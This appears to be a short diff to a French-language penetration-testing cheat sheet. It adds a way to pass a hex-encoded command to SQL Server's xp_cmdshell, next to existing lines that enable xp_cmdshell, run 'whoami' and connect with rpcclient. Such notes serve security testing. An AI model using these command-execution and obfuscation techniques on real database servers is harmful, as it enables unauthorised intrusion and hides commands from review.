@@ -40,6 +40,11 @@ RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;  
 RECONFIGURE;  
 EXECUTE xp_cmdshell 'whoami';  
+  
+### Quand la commande est trop longue:  
+DECLARE @cmd VARCHAR(8000);  
+SET @cmd=0x[cmd en hexa];  
+EXEC xp_cmdshell @cmd;  
 
 ## Utilisation du service RPC :
 **Connexion au serveur:** rpcclient -U "[USER]" [IP]  
